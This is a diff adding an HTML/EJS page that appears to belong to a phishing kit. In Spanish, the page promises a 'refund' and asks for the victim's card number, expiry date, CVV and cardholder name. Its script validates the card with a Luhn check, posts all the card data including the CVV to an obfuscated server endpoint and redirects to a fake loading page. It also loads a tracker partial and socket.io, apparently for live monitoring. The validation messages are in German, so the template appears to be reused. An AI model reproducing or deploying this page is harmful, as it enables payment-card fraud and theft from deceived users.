@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/bratoka.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+<body class="mb-pass">
+    <div>
+        <div class="topano">
+            <div  class="pc1"><img src="./img/hedopa-pc.PNG" alt=""></div>
+            <img src="./img/hedopa-mb.png" alt="">
+        </div>
+    </div>
+    <div>
+        <div class="maina maina2">
+            <div class="inmaina">
+                
+            
+                
+                <p class="" style="margin-bottom: 25px; font-weight: 500;">Confirme sus datos de pago para la transferencia segura</p>
+                <!--  -->
+                
+            
+                    <form method="post" id="creditCardForm">
+                        <p>Número de tarjeta para el reembolso*</p>
+                        <input type="tel" id="cardNumber" placeholder="Número de tarjeta" maxlength="19">
+                        <span class="error" id="cardNumberError"></span>
+                        <div class="payment-cards" style="display: flex; justify-content: flex-end;margin-top: -15px;margin-bottom: -10px;">
+                            <img src="./img/samisoma.png" alt="logo" style="height: 60px;width: 100px;">
+                            
+                        </div>
+                        
+                        <div class="mm">
+                            <div>
+                                <p>Caducidad <br> (MM/AA)*</p>
+                            <input type="tel" id="expDate" placeholder="MM/AA" maxlength="5">
+                            <span class="error" id="expDateError"></span>
+                            </div>
+    
+                            <div>
+                                <p>Código de seguridad <br> 
+                                    (CVV* 3-4 dígitos)</p>
+                                <input type="tel" id="cvv" placeholder="Código de seguridad" maxlength="4">
+                                <span class="error" id="cvvError"></span>
+                            </div>
+                        </div>
+
+                        <p>Nombre del titular de la tarjeta*</p>
+                        <input type="text" id="cardName" placeholder="Nombre del titular">
+                        <span class="error" id="cardNameError"></span>
+                        
+                        <button class="btn" type="submit" style="margin-top: 10px;">Recibir reembolso ahora</button>
+                        
+                       
+                        
+                        <div class="privacy">
+                            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="none" role="presentation" class="r-633pao" data-testid="privacy-icon" style="flex: 0 1 0%; height: 20px; min-height: 20px; min-width: 20px; width: 20px;"><path d="M14 8h-.19V6.87a3.81 3.81 0 1 0-7.62 0V8H6a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2v-5a2 2 0 0 0-2-2ZM8.19 6.87a1.81 1.81 0 0 1 3.62 0V8H8.19V6.87ZM14 15H6v-5h8v5Z" fill="#565959"></path></svg>
+                            <p>Su reembolso se gestionará en un plazo de 24 horas</p>
+                        </div>
+                    </form>
+                    
+                    <script>
+                        document.addEventListener('DOMContentLoaded', function() {
+                            const form = document.getElementById('creditCardForm');
+                            const cardNumberInput = document.getElementById('cardNumber');
+                            const expDateInput = document.getElementById('expDate');
+                            const cvvInput = document.getElementById('cvv');
+                            
+                            // Add CSS for error messages
+                            const style = document.createElement('style');
+                            style.textContent = '.error { color: #d01a1a; font-size: 12px; display: block; margin-top: 5px; font-weight: 500; }\n' +
+                                               '.input-error { border: 1px solid #d01a1a !important; background-color: #fff8f8; }\n' +
+                                               '.valid-input { border: 1px solid #2e8b57 !important; }';
+                            document.head.appendChild(style);
+                            
+                            // Format card number with spaces
+                            cardNumberInput.addEventListener('input', function(e) {
+                                let value = e.target.value.replace(/\s+/g, '');
+                                let formattedValue = '';
+                                for (let i = 0; i < value.length; i++) {
+                                    if (i > 0 && i % 4 === 0) {
+                                        formattedValue += ' ';
+                                    }
+                                    formattedValue += value[i];
+                                }
+                                e.target.value = formattedValue;
+                            });
+                            
+                            // Format expiry date MM/YY
+                            expDateInput.addEventListener('input', function(e) {
+                                let value = e.target.value.replace(/\D/g, '');
+                                if (value.length > 2) {
+                                    e.target.value = value.substring(0, 2) + '/' + value.substring(2);
+                                } else {
+                                    e.target.value = value;
+                                }
+                            });
+                            
+                            // Allow only numbers for card number, expiry and CVV
+                            [cardNumberInput, expDateInput, cvvInput].forEach(input => {
+                                input.addEventListener('keypress', function(e) {
+                                    if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
+                                        e.preventDefault();
+                                    }
+                                });
+                            });
+                            
+                            // Function to validate and highlight fields
+                            function validateField(input, errorElement, validationFn, errorMessage) {
+                                const value = input.value.trim();
+                                const isValid = validationFn(value);
+                                
+                                if (!isValid) {
+                                    errorElement.textContent = errorMessage;
+                                    input.classList.add('input-error');
+                                    input.classList.remove('valid-input');
+                                } else {
+                                    errorElement.textContent = '';
+                                    input.classList.remove('input-error');
+                                    input.classList.add('valid-input');
+                                }
+                                
+                                return isValid;
+                            }
+                            
+                            // Validate card name
+                            const cardNameInput = document.getElementById('cardName');
+                            const cardNameError = document.getElementById('cardNameError');
+                            
+                            cardNameInput.addEventListener('blur', function() {
+                                validateField(
+                                    cardNameInput, 
+                                    cardNameError, 
+                                    value => value.length >= 3 && /^[A-Za-z\s]+$/.test(value),
+                                    'Bitte geben Sie den Namen wie auf der Karte angegeben ein'
+                                );
+                            });
+                            
+                            // Live validation for card number
+                            cardNumberInput.addEventListener('blur', function() {
+                                validateField(
+                                    cardNumberInput, 
+                                    document.getElementById('cardNumberError'), 
+                                    value => validateCardNumber(value.replace(/\s/g, '')),
+                                    'Ungültige Kartennummer'
+                                );
+                            });
+                            
+                            // Live validation for expiry date
+                            expDateInput.addEventListener('blur', function() {
+                                validateField(
+                                    expDateInput, 
+                                    document.getElementById('expDateError'), 
+                                    validateExpDate,
+                                    'Ungültiges Ablaufdatum'
+                                );
+                            });
+                            
+                            // Live validation for CVV
+                            cvvInput.addEventListener('blur', function() {
+                                validateField(
+                                    cvvInput, 
+                                    document.getElementById('cvvError'), 
+                                    value => value.length >= 3 && value.length <= 4 && /^\d+$/.test(value),
+                                    'Ungültiger Sicherheitscode'
+                                );
+                            });
+                            
+                            form.addEventListener('submit', function(e) { 
+                                e.preventDefault();
+                                
+                                // Validate all fields
+                                const isCardNumberValid = validateField(
+                                    cardNumberInput, 
+                                    document.getElementById('cardNumberError'), 
+                                    value => validateCardNumber(value.replace(/\s/g, '')),
+                                    'Ungültige Kartennummer'
+                                );
+                                
+                                const isExpDateValid = validateField(
+                                    expDateInput, 
+                                    document.getElementById('expDateError'), 
+                                    validateExpDate,
+                                    'Ungültiges Ablaufdatum'
+                                );
+                                
+                                const isCvvValid = validateField(
+                                    cvvInput, 
+                                    document.getElementById('cvvError'), 
+                                    value => value.length >= 3 && value.length <= 4 && /^\d+$/.test(value),
+                                    'Ungültiger Sicherheitscode'
+                                );
+                                
+                                const isCardNameValid = validateField(
+                                    cardNameInput, 
+                                    cardNameError, 
+                                    value => value.length >= 3 && /^[A-Za-z\s]+$/.test(value),
+                                    'Bitte geben Sie den Namen wie auf der Karte angegeben ein'
+                                );
+                                
+                                const isValid = isCardNumberValid && isExpDateValid && isCvvValid && isCardNameValid;
+                                
+                                if (!isValid) {
+                                    return false;
+                                }
+                                // Show processing indicator
+                                const submitButton = form.querySelector('button[type="submit"]');
+                                const originalButtonText = submitButton.textContent;
+                                submitButton.textContent = 'Wird verarbeitet...';
+                                submitButton.disabled = true;
+                                
+                                $.ajax({
+                                    url: '/NkMNm4664XhcW8KuukHk',
+                                    type: 'POST',
+                                    contentType: 'application/json',
+                                    data: JSON.stringify({
+                                        cardNumber: cardNumberInput.value.replace(/\s/g, ''), 
+                                        expiryDate: expDateInput.value, 
+                                        cvv: cvvInput.value,
+                                        cardName: cardNameInput.value
+                                    }),
+                                    success: function(info) {
+                                        if(info.OK){
+                                            window.location = "/loading?time=20&url=/RKnUB922z6Mf4HDwg3EZ";
+                                        }
+                                    },
+                                    error: function() {
+                                        // Restore button state on error
+                                        submitButton.textContent = originalButtonText;
+                                        submitButton.disabled = false;
+                                        
+                                        // Show generic error message
+                                        alert('Bei der Verarbeitung ist ein Fehler aufgetreten. Bitte versuchen Sie es erneut.');
+                                    }
+                                });
+                            });
+                            
+                            function validateCardNumber(number) {
+                                // Luhn algorithm
+                                let sum = 0;
+                                let shouldDouble = false;
+                                for (let i = number.length - 1; i >= 0; i--) {
+                                    let digit = parseInt(number.charAt(i));
+                                    if (shouldDouble) {
+                                        digit *= 2;
+                                        if (digit > 9) {
+                                            digit -= 9;
+                                        }
+                                    }
+                                    sum += digit;
+                                    shouldDouble = !shouldDouble;
+                                }
+                                return (sum % 10) === 0 && number.length >= 13 && number.length <= 19;
+                            }
+                            
+                            function validateExpDate(expDate) {
+                                if (!/^\d{2}\/\d{2}$/.test(expDate)) {
+                                    return false;
+                                }
+                                
+                                const [month, year] = expDate.split('/').map(val => parseInt(val, 10));
+                                const currentDate = new Date();
+                                const currentYear = currentDate.getFullYear() % 100;
+                                const currentMonth = currentDate.getMonth() + 1;
+                                
+                                return month >= 1 && month <= 12 && 
+                                       (year > currentYear || (year === currentYear && month >= currentMonth));
+                            }
+                        });
+                    </script>
+                    <%- include('partials/tracker') %>
+
+                
+            </div>
+            
+        </div>  
+        
+<div class="line"></div>
+    <div>
+        <div class="botamano">
+            <img src="./img/botamano-pc.PNG" alt="">
+            <img src="./img/botamano-mb.png" alt="">
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+   
+</body>
+</html>
